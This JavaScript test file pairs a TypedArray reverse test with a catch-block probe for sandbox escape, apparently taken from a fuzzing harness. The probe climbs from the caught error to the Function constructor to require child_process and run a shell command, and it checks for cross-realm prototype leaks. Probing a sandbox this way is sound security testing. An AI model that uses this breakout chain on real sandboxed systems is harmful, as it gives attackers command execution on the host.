try {
    var buffer = new ArrayBuffer(64);
    testWithTypedArrayConstructors(function (TA) {
        var sample = new TA(buffer, 0, 4);
        var other = new TA(buffer, 0, 5);
        sample[0] = 42;
        sample[1] = 43;
        sample[2] = 2;
        sample[3] = 1;
        other[4] = 7;
        sample.reverse();
        assert(compareArray(sample, [
            1,
            2,
            43,
            42
        ]));
        assert(compareArray(other, [
            1,
            2,
            43,
            42,
            7
        ]));
        sample[0] = 7;
        sample[1] = 17;
        sample[2] = 1;
        sample[3] = 0;
        other[4] = 42;
        other.reverse();
        assert(compareArray(other, [
            42,
            0,
            1,
            17,
            7
        ]));
        assert(compareArray(sample, [
            42,
            0,
            1,
            17
        ]));
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}